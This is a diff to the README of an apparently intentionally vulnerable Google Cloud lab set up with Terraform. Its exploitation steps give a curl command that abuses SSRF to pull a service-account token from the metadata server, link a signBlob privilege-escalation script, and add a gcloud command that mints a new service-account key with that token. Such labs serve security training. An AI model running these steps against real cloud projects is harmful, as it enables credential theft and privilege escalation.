@@ -14,7 +14,12 @@ terraform apply --var gcp_project_id=YOUR_GCP_PROJECT_ID
 
 ## Exploitation
 1. In Terraform output you can locate a URL to the vulnerable Cloud Function. Exploit SSRF to obtain a temporary token of an attached service account which use `iam.serviceAccounts.signBlob` permission to sign URLs.
-```
+```bash
 curl https://YOUR.CLOUD.FUNCTION.DOMAIN/?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/token&auth=Metadata-Flavor:%20Google
 ```
 2. The Terraform output you can also find `App Engine` and `Compute Engine` default service accounts which were created automatically during the Cloud Function creation without explicit instructions. You can use them to escalate to `Editor` role via [the Rhinosecurity exploit](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-accessToken.py).
+3. To ensure that you obtained the priviliged service account, generate new service account key via next `gcloud` command:
+```bash
+gcloud iam service-accounts keys create service_account_key.json \
+    --iam-account=[DEFAULT_SERVICE_ACCOUNT_EMAIL] --access-token-file=[FILE_WITH_TOKEN]
+```
